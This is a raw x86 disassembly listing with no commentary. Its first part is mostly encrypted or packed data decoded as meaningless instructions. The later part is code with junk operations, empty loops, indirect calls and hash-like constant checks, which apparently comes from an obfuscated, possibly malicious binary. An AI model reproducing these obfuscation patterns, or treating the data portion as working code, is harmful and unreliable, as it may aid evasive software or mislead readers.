  41bb7d:	add    esp,DWORD PTR [edx+0x2b]
  41bb80:	adc    ebp,DWORD PTR [edx-0x42]
  41bb83:	adc    eax,0xb4803674
  41bb88:	cwde   
  41bb89:	popf   
  41bb8a:	mov    ebx,ss
  41bb8c:	xlat   BYTE PTR ds:[ebx]
  41bb8d:	mov    ch,0x22
  41bb8f:	pop    edx
  41bb90:	pop    ebx
  41bb91:	inc    edx
  41bb92:	fadd   DWORD PTR [eax-0x69d9ec60]
  41bb98:	fist   WORD PTR [ebx-0x4325954a]
  41bb9e:	mov    dh,0x7c
  41bba0:	mov    al,ds:0xbb73acf6
  41bba5:	daa    
  41bba6:	push   esp
  41bba7:	sub    BYTE PTR [eax],0x90
  41bbaa:	or     ebp,DWORD PTR [ebx+0x68]
  41bbad:	iret   
  41bbae:	mov    ebx,0xd648b84d
  41bbb3:	xchg   DWORD PTR [esi+0x79],eax
  41bbb6:	imul   ebx,DWORD PTR [ebx+0x241e08fd],0x7341ef9b
  41bbc0:	mov    esp,0x245cba36
  41bbc5:	(bad)  
  41bbc6:	pusha  
  41bbc7:	outs   dx,BYTE PTR ds:[esi]
  41bbc8:	loopne 0x41bc35
  41bbca:	lock push eax
  41bbcc:	sar    ch,0xb4
  41bbcf:	xor    bl,BYTE PTR [eax+0x285af592]
  41bbd5:	sub    ch,cl
  41bbd7:	adc    al,0x73
  41bbd9:	aaa    
  41bbda:	mov    ebp,0x8b108161
  41bbdf:	sub    al,0x57
  41bbe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbe2:	sbb    eax,0x88e5b6b1
  41bbe7:	jge    0x41bbff
  41bbe9:	mov    edi,0xb641e756
  41bbee:	gs mov bh,0x48
  41bbf1:	mov    esi,0x5d2a62bc
  41bbf6:	ss pusha 
  41bbf8:	outs   dx,BYTE PTR ds:[esi]
  41bbf9:	mov    ds:0x577974ca,eax
  41bbfe:	fld    TBYTE PTR [ebp-0xc343f5f]
  41bc04:	jg     0x41bc1a
  41bc06:	adc    eax,0x101200fb
  41bc0b:	cli    
  41bc0c:	mov    ebp,0x675a5e21
  41bc11:	cld    
  41bc12:	sbb    DWORD PTR [esi+0x74],esi
  41bc15:	shl    ah,1
  41bc17:	fdivr  QWORD PTR [ebp-0x13]
  41bc1a:	or     eax,0xc80c607f
  41bc1f:	aaa    
  41bc20:	je     0x41bbe0
  41bc22:	sbb    edi,DWORD PTR [ecx-0x24]
  41bc25:	outs   dx,BYTE PTR ds:[esi]
  41bc26:	jl     0x41bbba
  41bc28:	sub    al,0x8e
  41bc2a:	cmp    BYTE PTR [ebp-0x22],ch
  41bc2d:	xchg   BYTE PTR [eax],al
  41bc2f:	push   ecx
  41bc30:	sbb    esi,DWORD PTR [esi]
  41bc32:	sbb    al,0xd6
  41bc34:	sub    ecx,DWORD PTR [ebx+edx*2-0x75]
  41bc38:	add    DWORD PTR [edi-0x391f2ee2],esi
  41bc3e:	sbb    eax,0x8944d446
  41bc43:	inc    esi
  41bc44:	pushf  
  41bc45:	push   ss
  41bc46:	enter  0x32a6,0x81
  41bc4a:	push   ds
  41bc4b:	add    DWORD PTR [ebx-0x78],esi
  41bc4e:	mov    DWORD PTR [ebp-0x20],edi
  41bc51:	mov    esp,0x7a658735
  41bc56:	xor    BYTE PTR [ebx-0x32362909],ah
  41bc5c:	(bad)  
  41bc5d:	pop    edi
  41bc5e:	pop    eax
  41bc5f:	mov    ch,0x14
  41bc61:	fwait
  41bc62:	sbb    DWORD PTR ds:0xf76209f0,eax
  41bc68:	mov    edi,0xb229e3c8
  41bc6d:	mov    ch,BYTE PTR [ecx+0x73]
  41bc70:	or     BYTE PTR [ebx+0x7],bh
  41bc73:	pop    es
  41bc74:	imul   eax,DWORD PTR [edi],0x4f6f967d
  41bc7a:	lds    esp,FWORD PTR [ebx]
  41bc7c:	enter  0x21ab,0xf5
  41bc80:	jo     0x41bc0b
  41bc82:	pop    ebx
  41bc83:	fbstp  TBYTE PTR [edx+0x7a]
  41bc86:	mov    ah,0x49
  41bc88:	imul   ebx,ebx,0xfffffffe
  41bc8b:	test   eax,0xf6cd14e5
  41bc90:	cs dec edx
  41bc92:	ja     0x41bce5
  41bc94:	mov    BYTE PTR [edi+ebx*8-0x4f],cl
  41bc98:	outs   dx,BYTE PTR ds:[esi]
  41bc99:	xchg   ecx,eax
  41bc9a:	imul   ecx,DWORD PTR [ebp+0x75],0xfffffff1
  41bc9e:	xlat   BYTE PTR ds:[ebx]
  41bc9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bca0:	cmp    DWORD PTR [edi+0x7a],edi
  41bca3:	cmp    esp,DWORD PTR [ecx+0x6b]
  41bca6:	push   eax
  41bca7:	push   ebx
  41bca8:	mov    ah,0xfe
  41bcaa:	jge    0x41bc7b
  41bcac:	call   0x50a8:0xfe191092
  41bcb3:	mov    cs,WORD PTR [ebx-0x24d7470f]
  41bcb9:	pop    eax
  41bcba:	cmc    
  41bcbb:	dec    ebx
  41bcbc:	xor    al,0x31
  41bcbe:	mov    ebx,DWORD PTR [eax-0x16]
  41bcc1:	push   eax
  41bcc2:	dec    ebp
  41bcc3:	scas   eax,DWORD PTR es:[edi]
  41bcc4:	mov    eax,ds:0xcd97d2b7
  41bcc9:	mov    WORD PTR [esi-0x1899c7b8],?
  41bccf:	jo     0x41bc52
  41bcd1:	xchg   ebx,eax
  41bcd2:	or     eax,0x9828a917
  41bcd7:	fist   DWORD PTR [ebp+0x7c1b2b5c]
  41bcdd:	scas   al,BYTE PTR es:[edi]
  41bcde:	pop    esi
  41bcdf:	adc    BYTE PTR [edi+esi*8],dl
  41bce2:	cmp    al,0xf4
  41bce4:	iret   
  41bce5:	mov    ebp,0x4ae3306a
  41bcea:	xchg   esp,eax
  41bceb:	add    al,0xd9
  41bced:	ss xchg esi,eax
  41bcef:	mov    ebx,0xbf43ecdf
  41bcf4:	aad    0x2b
  41bcf6:	mov    ds:0x1da010e1,al
  41bcfb:	xor    dh,BYTE PTR ds:0xf94b811e
  41bd01:	aaa    
  41bd02:	mov    dh,0xdb
  41bd04:	loop   0x41bd15
  41bd06:	clc    
  41bd07:	out    0x25,al
  41bd09:	js     0x41bcfe
  41bd0b:	fimul  DWORD PTR [esp+ebx*2-0x5b]
  41bd0f:	aad    0xb1
  41bd11:	jae    0x41bd3c
  41bd13:	pop    ecx
  41bd14:	jbe    0x41bd54
  41bd16:	mov    eax,esi
  41bd18:	jge    0x41bd0e
  41bd1a:	add    al,0x58
  41bd1c:	sub    esi,0x7a
  41bd1f:	imul   DWORD PTR [edi+ecx*2+0x7]
  41bd23:	mov    esi,eax
  41bd25:	arpl   WORD PTR [edx+edi*8],di
  41bd28:	xchg   ecx,eax
  41bd29:	mov    esi,0x249433d
  41bd2e:	mov    ah,0x94
  41bd30:	adc    al,0xa
  41bd32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd33:	mov    al,ds:0xb9da62a0
  41bd38:	nop
  41bd39:	and    al,0xe3
  41bd3b:	fidivr WORD PTR [edi+0x12]
  41bd3e:	int3   
  41bd3f:	in     al,0x4c
  41bd41:	es (bad) 
  41bd43:	int    0xfe
  41bd45:	call   0xa70d:0xbac588b8
  41bd4c:	neg    DWORD PTR [edi]
  41bd4e:	call   0x6bc5:0xfc445818
  41bd55:	sbb    ch,BYTE PTR [edx+0x37967a01]
  41bd5b:	jb     0x41bd3f
  41bd5d:	leave  
  41bd5e:	dec    BYTE PTR [ebp+0x6]
  41bd61:	ins    DWORD PTR es:[edi],dx
  41bd62:	imul   edx,DWORD PTR [edi],0x2d
  41bd65:	add    BYTE PTR [ebp-0x213f44ae],ch
  41bd6b:	hlt    
  41bd6c:	dec    edi
  41bd6d:	mov    edi,esi
  41bd6f:	mov    al,ds:0x7ec5eff6
  41bd74:	ds cmp al,0x76
  41bd77:	push   ds
  41bd78:	ins    DWORD PTR es:[edi],dx
  41bd79:	sbb    DWORD PTR [ecx-0x4e5716f4],ecx
  41bd7f:	fmul   QWORD PTR [ebx+0x1827756f]
  41bd85:	call   0xa3b40a20
  41bd8a:	fwait
  41bd8b:	jns    0x41bde1
  41bd8d:	push   0x51
  41bd8f:	xchg   ecx,eax
  41bd90:	xchg   edx,eax
  41bd91:	jmp    0x9629f039
  41bd96:	test   eax,0xd2757ef9
  41bd9b:	dec    ecx
  41bd9c:	pop    es
  41bd9d:	cwde   
  41bd9e:	iret   
  41bd9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bda0:	cdq    
  41bda1:	or     BYTE PTR [ebx-0x4823de7c],bh
  41bda7:	dec    edx
  41bda8:	fxch   st(7)
  41bdaa:	cmp    dl,BYTE PTR [esi+ebx*2-0x6264013b]
  41bdb1:	mov    dl,0xe0
  41bdb3:	or     eax,0xd7c3728b
  41bdb8:	jge    0x41bd88
  41bdba:	cwde   
  41bdbb:	jge    0x41bda9
  41bdbd:	xchg   esi,eax
  41bdbe:	cdq    
  41bdbf:	cmp    bl,BYTE PTR [edx+edi*8-0x50c1ca94]
  41bdc6:	jae    0x41bd8a
  41bdc8:	cmp    bl,al
  41bdca:	dec    ebp
  41bdcb:	ret    0xb3b2
  41bdce:	xchg   DWORD PTR [edx-0x6],ecx
  41bdd1:	loopne 0x41bdce
  41bdd3:	mov    BYTE PTR [eax-0x22164e27],ch
  41bdd9:	or     al,0x31
  41bddb:	in     al,dx
  41bddc:	cld    
  41bddd:	lahf   
  41bdde:	jo     0x41be45
  41bde0:	adc    al,0x5b
  41bde2:	adc    DWORD PTR [ecx+eax*2+0x734132cd],ebp
  41bde9:	cmp    DWORD PTR [edx],ebp
  41bdeb:	enter  0x4dcd,0x6e
  41bdef:	shl    BYTE PTR [ecx+0x21a1f8ee],cl
  41bdf5:	fldcw  WORD PTR [esi]
  41bdf7:	call   0xc29fe532
  41bdfc:	push   ss
  41bdfd:	push   esp
  41bdfe:	xchg   edi,eax
  41bdff:	pop    esi
  41be00:	push   esp
  41be01:	stos   DWORD PTR es:[edi],eax
  41be02:	lds    esp,FWORD PTR [esi+0x6f36c787]
  41be08:	test   eax,ebp
  41be0a:	clc    
  41be0b:	sbb    DWORD PTR [edi],edi
  41be0d:	lods   al,BYTE PTR ds:[esi]
  41be0e:	mov    cl,0xf0
  41be10:	mov    edx,0x60e0a7ef
  41be15:	jmp    0x1b2b:0xe0a9f0c3
  41be1c:	or     BYTE PTR [esi-0x752e1803],ch
  41be22:	lds    edi,FWORD PTR [esi]
  41be24:	outs   dx,DWORD PTR ds:[esi]
  41be25:	mov    al,ds:0x58b7a31e
  41be2a:	sahf   
  41be2b:	int3   
  41be2c:	(bad)  
  41be2d:	std    
  41be2e:	inc    ebp
  41be2f:	pop    eax
  41be30:	push   edx
  41be31:	mov    bl,0xc6
  41be33:	repnz imul esp,eax,0x59
  41be37:	ret    0xcb49
  41be3a:	or     bh,BYTE PTR [edi]
  41be3c:	and    DWORD PTR [ebx+0x34],ebp
  41be3f:	shr    BYTE PTR fs:[edx+0x6094277d],0x65
  41be47:	ss jmp 0x18bcebc3
  41be4d:	add    cl,BYTE PTR [ebx-0x16]
  41be50:	cmp    al,0xf7
  41be52:	icebp  
  41be53:	loopne 0x41be99
  41be55:	clc    
  41be56:	aas    
  41be57:	shl    eax,1
  41be59:	jo     0x41be09
  41be5b:	adc    bh,BYTE PTR [eax]
  41be5d:	fiadd  WORD PTR [ebx-0x8]
  41be60:	stc    
  41be61:	mov    al,0x9b
  41be63:	data16 fisub WORD PTR [ebx+0x2cf94d09]
  41be6a:	(bad)  [ecx]
  41be6c:	jmp    0x41be91
  41be6e:	or     al,0xdd
  41be70:	rol    BYTE PTR [edx*8-0x2fca57ce],0xf1
  41be78:	loope  0x41bef1
  41be7a:	ror    BYTE PTR [esi+eax*4+0x28],0x54
  41be7f:	pusha  
  41be80:	fadd   DWORD PTR [edi-0x75]
  41be83:	push   ebx
  41be84:	xchg   esi,eax
  41be85:	stos   DWORD PTR es:[edi],eax
  41be86:	jns    0x41be13
  41be88:	fisttp WORD PTR [eax+0xf0fca16]
  41be8e:	rcl    ah,cl
  41be90:	aas    
  41be91:	arpl   bp,ax
  41be93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be94:	mov    ebx,0xb23a3d71
  41be99:	mov    al,ds:0x58c27747
  41be9e:	arpl   WORD PTR [eax-0x6b845131],sp
  41bea4:	mov    edi,0x595f11db
  41bea9:	mov    ds:0x81d2c44b,eax
  41beae:	mov    dh,0xa
  41beb0:	jae    0x41bf19
  41beb2:	fwait
  41beb3:	je     0x41be35
  41beb5:	fwait
  41beb6:	bound  esi,QWORD PTR [esi+0x20c07655]
  41bebc:	mov    DWORD PTR [ecx-0x3fc71e47],edi
  41bec2:	lock ss mov al,0x99
  41bec6:	(bad)  
  41bec7:	shl    esp,cl
  41bec9:	call   0xb1576cbf
  41bece:	popf   
  41becf:	sti    
  41bed0:	sbb    DWORD PTR [eax-0xf],ebx
  41bed3:	push   es
  41bed4:	aam    0x17
  41bed6:	jecxz  0x41beb1
  41bed8:	les    esp,FWORD PTR [edx-0x46]
  41bedb:	add    dh,bh
  41bedd:	or     eax,DWORD PTR ds:0x737eb43d
  41bee3:	stos   BYTE PTR es:[edi],al
  41bee4:	sbb    BYTE PTR [esi+0x5d],bh
  41bee7:	mov    bh,0x41
  41bee9:	pop    edx
  41beea:	scas   eax,DWORD PTR es:[edi]
  41beeb:	pop    esp
  41beec:	test   al,0x47
  41beee:	push   es
  41beef:	or     DWORD PTR [ebp-0x79acf0ad],eax
  41bef5:	call   0x94618afe
  41befa:	sub    eax,0xe106f558
  41beff:	out    dx,eax
  41bf00:	add    dl,0xa1
  41bf03:	add    ah,bl
  41bf05:	nop
  41bf06:	sbb    eax,0x37327533
  41bf0b:	out    0x26,eax
  41bf0d:	test   eax,0xafe35cb9
  41bf12:	adc    ebp,ecx
  41bf14:	inc    eax
  41bf15:	into   
  41bf16:	pop    ebp
  41bf17:	int    0x69
  41bf19:	xchg   ebp,eax
  41bf1a:	xchg   edx,eax
  41bf1b:	fldenv [ebx+0x771f3ff7]
  41bf21:	bound  ecx,QWORD PTR [eax+0x5d296ac]
  41bf27:	(bad)  
  41bf28:	xlat   BYTE PTR ds:[ebx]
  41bf29:	mov    bl,0x6d
  41bf2b:	and    al,0x2b
  41bf2d:	xor    DWORD PTR [eax],esp
  41bf2f:	mov    dl,0xba
  41bf31:	jp     0x41bf57
  41bf33:	jp     0x41beb9
  41bf35:	mov    esp,DWORD PTR [ecx+0x2c71e64c]
  41bf3b:	and    DWORD PTR [eax],esp
  41bf3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf3e:	pop    ebx
  41bf3f:	bound  edi,QWORD PTR [ebx-0x14]
  41bf42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf43:	(bad)  
  41bf44:	in     eax,0xc6
  41bf46:	pop    ss
  41bf47:	push   ebp
  41bf48:	retf   
  41bf49:	sub    eax,0x30c39bb9
  41bf4e:	push   cs
  41bf4f:	sbb    eax,0x4327fbba
  41bf54:	mov    ss,WORD PTR [edx+0x6f]
  41bf57:	xchg   BYTE PTR [edx],al
  41bf59:	(bad)  
  41bf5a:	pop    ss
  41bf5b:	dec    edi
  41bf5c:	mov    cl,0xf4
  41bf5e:	dec    edi
  41bf5f:	scas   al,BYTE PTR es:[edi]
  41bf60:	xchg   edi,eax
  41bf61:	repnz xor DWORD PTR [eax+0x0],ebx
  41bf65:	ffree  st(2)
  41bf67:	push   esp
  41bf68:	fs out 0xa8,al
  41bf6b:	test   BYTE PTR [edx+0x13],ah
  41bf6e:	mov    ds:0x7ad6fa87,al
  41bf73:	ret    
  41bf74:	cwde   
  41bf75:	inc    BYTE PTR [ecx-0xc]
  41bf78:	mov    al,ds:0xf30767e6
  41bf7d:	leave  
  41bf7e:	fadd   QWORD PTR [esi]
  41bf80:	daa    
  41bf81:	xlat   BYTE PTR ds:[ebx]
  41bf82:	or     al,0x53
  41bf84:	ins    DWORD PTR es:[edi],dx
  41bf85:	inc    esp
  41bf86:	xchg   esi,eax
  41bf87:	dec    edx
  41bf88:	fucomip st,st(1)
  41bf8a:	jg     0x41bf72
  41bf8c:	xchg   ecx,eax
  41bf8d:	mov    WORD PTR [ebx-0x22],gs
  41bf90:	pushf  
  41bf91:	push   0xa8afc1cf
  41bf96:	ins    DWORD PTR es:[edi],dx
  41bf97:	test   al,0xbf
  41bf99:	sub    ecx,esp
  41bf9b:	gs pop es
  41bf9d:	mov    ch,0x5e
  41bf9f:	or     al,0x33
  41bfa1:	dec    edi
  41bfa2:	bound  ebp,QWORD PTR [edi-0x2f008d8d]
  41bfa8:	dec    eax
  41bfa9:	addr16 test al,0xbc
  41bfac:	mov    cl,0xf0
  41bfae:	popa   
  41bfaf:	stos   DWORD PTR es:[edi],eax
  41bfb0:	and    dl,BYTE PTR [edi+0x306d9e6a]
  41bfb6:	xchg   esp,eax
  41bfb7:	stos   BYTE PTR es:[edi],al
  41bfb8:	(bad)  
  41bfb9:	das    
  41bfba:	xor    al,0x78
  41bfbc:	push   ss
  41bfbd:	and    BYTE PTR [edx-0xa],0x9d
  41bfc1:	mov    edx,DWORD PTR [edx]
  41bfc3:	dec    ebx
  41bfc4:	push   0x13
  41bfc6:	xor    DWORD PTR [eax+eax*8-0x3e],edi
  41bfca:	push   es
  41bfcb:	pop    edi
  41bfcc:	xchg   ecx,eax
  41bfcd:	jl     0x41c005
  41bfcf:	dec    DWORD PTR ds:0xd5e170b6
  41bfd5:	inc    esp
  41bfd6:	sub    ecx,ecx
  41bfd8:	(bad)  
  41bfda:	jl     0x41bf82
  41bfdc:	(bad)  
  41bfdd:	out    dx,al
  41bfde:	push   es
  41bfdf:	or     BYTE PTR [edi+0x40],cl
  41bfe2:	push   edx
  41bfe3:	sahf   
  41bfe4:	nop
  41bfe5:	push   esi
  41bfe6:	xchg   ecx,eax
  41bfe7:	jb     0x41bfd6
  41bfe9:	inc    BYTE PTR ds:0x12f22b29
  41bfef:	mov    ebp,0xa20e356f
  41bff4:	xchg   esi,eax
  41bff5:	sbb    bl,BYTE PTR [ecx+edi*4-0x36]
  41bff9:	push   esp
  41bffa:	adc    al,0x8a
  41bffc:	lods   eax,DWORD PTR ds:[esi]
  41bffd:	cwde   
  41bffe:	retf   0x94dd
  41c001:	cwde   
  41c002:	pop    ds
  41c003:	cmp    esp,eax
  41c005:	dec    DWORD PTR [esi-0x14]
  41c008:	aam    0x87
  41c00a:	dec    ecx
  41c00b:	inc    edi
  41c00c:	(bad)  
  41c00d:	int    0x2d
  41c00f:	mov    al,0xc5
  41c011:	aad    0xba
  41c013:	push   esi
  41c014:	mov    esi,0x2c278029
  41c019:	(bad)  
  41c01b:	dec    ebp
  41c01c:	stos   DWORD PTR es:[edi],eax
  41c01d:	mov    ch,0x11
  41c01f:	ret    0x995c
  41c022:	cli    
  41c023:	jbe    0x41bfc3
  41c025:	fild   WORD PTR ds:0xf1d87d7b
  41c02b:	mov    al,ds:0xda4a447f
  41c030:	mov    ds:0x33cc8a9b,al
  41c035:	push   esi
  41c036:	in     eax,0x21
  41c038:	xchg   esp,eax
  41c039:	dec    esi
  41c03a:	and    al,0x81
  41c03c:	sbb    al,0x78
  41c03e:	adc    al,0x33
  41c040:	sbb    DWORD PTR [eax-0x73],edi
  41c043:	es in  eax,0x34
  41c046:	scas   al,BYTE PTR es:[edi]
  41c047:	sbb    bh,ah
  41c049:	mov    ecx,0x1f9a3d61
  41c04e:	pop    edx
  41c04f:	clc    
  41c050:	outs   dx,BYTE PTR ds:[esi]
  41c051:	in     eax,0xab
  41c053:	popa   
  41c054:	icebp  
  41c055:	cs xchg edi,eax
  41c057:	xchg   esi,eax
  41c058:	shl    BYTE PTR [edx-0x60],1
  41c05b:	pop    edi
  41c05c:	jae    0x41bffc
  41c05e:	scas   al,BYTE PTR es:[edi]
  41c05f:	mov    eax,0x86098ff
  41c064:	jmp    0x9ee31a19
  41c069:	test   al,0xca
  41c06b:	ficomp DWORD PTR [esi-0x1cc3be46]
  41c071:	mov    bh,0xb7
  41c073:	iret   
  41c074:	mov    ah,0xf
  41c076:	cwde   
  41c077:	pop    esp
  41c078:	jmp    0xd5e7132e
  41c07d:	mov    DWORD PTR [edx-0x6cafe4e0],ebx
  41c083:	jp     0x41c016
  41c085:	dec    edi
  41c086:	jecxz  0x41c07e
  41c088:	ins    DWORD PTR es:[edi],dx
  41c089:	aas    
  41c08a:	dec    edi
  41c08b:	sub    BYTE PTR ds:0x6517b777,ah
  41c091:	dec    ebx
  41c092:	add    esp,DWORD PTR es:[edx]
  41c095:	imul   eax,DWORD PTR [edi-0x520bc14e],0x19a0bc97
  41c09f:	cdq    
  41c0a0:	daa    
  41c0a1:	dec    ebx
  41c0a2:	ret    
  41c0a3:	cmp    ecx,DWORD PTR [ecx-0x1bc91a41]
  41c0a9:	jp     0x41c103
  41c0ab:	jns    0x41c11b
  41c0ad:	test   al,0x33
  41c0af:	in     eax,0x1
  41c0b1:	aad    0xc3
  41c0b3:	xor    al,0xfa
  41c0b5:	jo     0x41c046
  41c0b7:	sub    edi,eax
  41c0b9:	aad    0x6f
  41c0bb:	shl    eax,cl
  41c0bd:	stos   BYTE PTR es:[edi],al
  41c0be:	jmp    0xb59f451e
  41c0c3:	mov    WORD PTR [ecx+0x33eb25a7],ds
  41c0c9:	pop    ds
  41c0ca:	fdiv   st,st(5)
  41c0cc:	inc    eax
  41c0cd:	test   DWORD PTR [eax],eax
  41c0cf:	push   es
  41c0d0:	scas   eax,DWORD PTR es:[edi]
  41c0d1:	and    DWORD PTR [ebx+esi*8-0x34],esp
  41c0d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0d6:	test   al,0x97
  41c0d8:	data16 in al,0x54
  41c0db:	icebp  
  41c0dc:	stos   BYTE PTR es:[edi],al
  41c0dd:	pop    esp
  41c0de:	and    BYTE PTR [esi+0x5a0c829b],dl
  41c0e4:	or     ecx,DWORD PTR [ebx-0x10b1a9ff]
  41c0ea:	xor    BYTE PTR [eax+0x1b],ah
  41c0ed:	std    
  41c0ee:	int3   
  41c0ef:	dec    esi
  41c0f0:	pop    esp
  41c0f1:	not    BYTE PTR [ebx+esi*2+0x7e]
  41c0f5:	pop    edx
  41c0f6:	repz aad 0x69
  41c0f9:	jg     0x41c0b8
  41c0fb:	jmp    0x4dccd6d3
  41c100:	call   0xcf7dbb08
  41c105:	je     0x41c147
  41c10b:	mov    ecx,DWORD PTR [ebp-0x18]
  41c10e:	add    ecx,eax
  41c110:	mov    DWORD PTR [ebp-0x1c],ecx
  41c113:	mov    ecx,DWORD PTR [ebp-0x30]
  41c116:	mov    edx,DWORD PTR [ebp-0x2c]
  41c119:	mov    edx,0xa147
  41c11e:	xor    cx,dx
  41c121:	mov    edx,DWORD PTR [ebp-0x1c]
  41c124:	mov    edx,DWORD PTR [edx+0xc]
  41c127:	add    cx,si
  41c12a:	cmp    WORD PTR [eax+edx*1],cx
  41c12e:	jne    0x41c147
  41c134:	mov    ecx,DWORD PTR ds:0x4262c9
  41c13a:	mov    ecx,DWORD PTR [ecx+0x198]
  41c140:	mov    DWORD PTR [ecx],eax
  41c142:	jmp    0x41c1c5
  41c147:	push   DWORD PTR [ebp+0x1c]
  41c14a:	push   DWORD PTR [ebp+0x18]
  41c14d:	jmp    0x41c1b4
  41c152:	mov    eax,DWORD PTR [ebp+0x18]
  41c155:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c158:	cmp    eax,0x70941f9e
  41c15d:	jne    0x41c176
  41c163:	cmp    ecx,ebx
  41c165:	jne    0x41c176
  41c16b:	push   ebx
  41c16c:	push   0x70941f9b
  41c171:	jmp    0x41c1b4
  41c176:	mov    ecx,DWORD PTR [ebp+0x18]
  41c179:	mov    edx,DWORD PTR [ebp+0x1c]
  41c17c:	mov    eax,0x70941f98
  41c181:	cmp    ecx,eax
  41c183:	jne    0x41c198
  41c189:	cmp    edx,ebx
  41c18b:	jne    0x41c198
  41c191:	push   ebx
  41c192:	push   edi
  41c193:	jmp    0x41c1b4
  41c198:	mov    ecx,DWORD PTR [ebp+0x18]
  41c19b:	mov    edx,DWORD PTR [ebp+0x1c]
  41c19e:	cmp    ecx,0x70941f9b
  41c1a4:	jne    0x41c1c5
  41c1aa:	cmp    edx,ebx
  41c1ac:	jne    0x41c1c5
  41c1b2:	push   ebx
  41c1b3:	push   eax
  41c1b4:	push   DWORD PTR [ebp+0x14]
  41c1b7:	push   DWORD PTR [ebp+0x10]
  41c1ba:	push   DWORD PTR [ebp+0xc]
  41c1bd:	push   DWORD PTR [ebp+0x8]
  41c1c0:	call   0x417355
  41c1c5:	pop    edi
  41c1c6:	pop    esi
  41c1c7:	pop    ebx
  41c1c8:	leave  
  41c1c9:	ret    0x18
  41c1cc:	push   ebp
  41c1cd:	mov    ebp,esp
  41c1cf:	and    esp,0xfffffff8
  41c1d2:	add    DWORD PTR ds:0x426f09,0x426ef5
  41c1dc:	mov    al,ds:0x4263ef
  41c1e1:	sub    esp,0x54
  41c1e4:	mov    DWORD PTR ds:0x426eb5,0x2e24
  41c1ee:	push   ebx
  41c1ef:	push   esi
  41c1f0:	push   edi
  41c1f1:	mov    DWORD PTR ds:0x426f15,0x7495
  41c1fb:	cmp    al,BYTE PTR ds:0x4263fa
  41c201:	mov    DWORD PTR ds:0x426ee9,0x194c
  41c20b:	je     0x41c22c
  41c211:	or     DWORD PTR ds:0x426eed,0x426ed5
  41c21b:	xor    eax,eax
  41c21d:	mov    DWORD PTR ds:0x426ee1,0xaaa
  41c227:	jmp    0x41d276
  41c22c:	mov    al,ds:0x42640c
  41c231:	cmp    al,BYTE PTR ds:0x42641b
  41c237:	mov    DWORD PTR ds:0x426ee9,0x1f8d
  41c241:	jne    0x41c211
  41c247:	neg    edi
  41c249:	mov    edi,DWORD PTR ds:0x430a50
  41c24f:	and    DWORD PTR ds:0x426ee1,0x426e95
  41c259:	push   0x426425
  41c25e:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c268:	push   0x426435
  41c26d:	adc    DWORD PTR ds:0x426eed,0x426ed5
  41c277:	call   edi
  41c279:	test   eax,eax
  41c27b:	mov    DWORD PTR ds:0x426ee5,0x502f
  41c285:	je     0x41c211
  41c28b:	push   0x426449
  41c290:	and    DWORD PTR ds:0x426f1d,0x426ef1
  41c29a:	call   DWORD PTR ds:0x430a34
  41c2a0:	mov    DWORD PTR [esp+0x44],0x0
  41c2a8:	mov    ecx,0xf89c85b5
  41c2ad:	mov    DWORD PTR [esp+0x10],ecx
  41c2b1:	mov    DWORD PTR ds:0x426edd,0x1a
  41c2bb:	cmp    DWORD PTR ds:0x426edd,0x0
  41c2c2:	je     0x41c31b
  41c2c8:	cmp    DWORD PTR ds:0x426edd,0x7
  41c2cf:	jle    0x41c31b
  41c2d5:	jmp    0x41c2ed
  41c2da:	push   DWORD PTR [ebp-0x20]
  41c2dd:	push   0x4e76
  41c2e2:	push   0x4592
  41c2e7:	call   DWORD PTR ds:0x430a18
  41c2ed:	cmp    DWORD PTR ds:0x426edd,0x8
  41c2f4:	jne    0x41c309
  41c2fa:	xor    edx,edx
  41c2fc:	add    edx,DWORD PTR ds:0x426edd
  41c302:	dec    edx
  41c303:	mov    DWORD PTR ds:0x426edd,edx
  41c309:	mov    edx,DWORD PTR ds:0x426edd
  41c30f:	dec    edx
  41c310:	mov    DWORD PTR ds:0x426edd,edx
  41c316:	jmp    0x41c2bb
  41c31b:	mov    DWORD PTR [esp+0x1c],0xf89c85b4
  41c323:	lea    eax,[esp+0x34]
  41c327:	mov    DWORD PTR [esp+0x44],eax
  41c32b:	mov    esi,DWORD PTR ds:0x428d15
  41c331:	mov    ebx,DWORD PTR ds:0x42af69
  41c337:	sub    esi,ebx
  41c339:	sub    esi,DWORD PTR [esi+ebx*1]
  41c33c:	lea    eax,[esp+0x30]
  41c340:	mov    DWORD PTR [esp+0x28],eax
  41c344:	sub    DWORD PTR ds:0x426ea9,0x492f
  41c34e:	mov    eax,ds:0x4262c9
  41c353:	mov    edx,DWORD PTR ds:0x426ef9
  41c359:	sbb    DWORD PTR ds:0x426f05,edx
  41c35f:	mov    eax,DWORD PTR [eax+0x1c8]
  41c365:	mov    DWORD PTR ds:0x426f29,0x788d
  41c36f:	mov    eax,DWORD PTR [eax]
  41c371:	mov    edx,DWORD PTR [esp+0x28]
  41c375:	and    DWORD PTR ds:0x426efd,0x0
  41c37f:	jmp    0x41c393
  41c384:	xor    esi,esi
  41c386:	xor    esi,DWORD PTR ds:0x426efd
  41c38c:	inc    esi
  41c38d:	mov    DWORD PTR ds:0x426efd,esi
  41c393:	cmp    DWORD PTR ds:0x426efd,0x1a
  41c39a:	jae    0x41c3cb
  41c3a0:	cmp    DWORD PTR ds:0x426efd,0x1c
  41c3a7:	jge    0x41c3cb
  41c3ad:	jmp    0x41c3c6
  41c3b2:	push   DWORD PTR [ebp-0xc]
  41c3b5:	push   0x4c83
  41c3ba:	push   DWORD PTR [ebp-0x14]
  41c3bd:	push   DWORD PTR [ebp-0x1c]
  41c3c0:	call   DWORD PTR ds:0x430a4c
  41c3c6:	jmp    0x41c384
  41c3cb:	mov    esi,0x75108b3
  41c3d0:	and    DWORD PTR ds:0x426e81,0x1564
  41c3da:	xor    eax,esi
  41c3dc:	mov    ebx,0x3272fa
  41c3e1:	add    eax,ebx
  41c3e3:	mov    DWORD PTR [edx],eax
  41c3e5:	mov    DWORD PTR ds:0x426ea1,0x7a67
  41c3ef:	mov    eax,ds:0x426d99
  41c3f4:	mov    DWORD PTR ds:0x426f1d,0x65da
  41c3fe:	cmp    eax,0x455dedfa
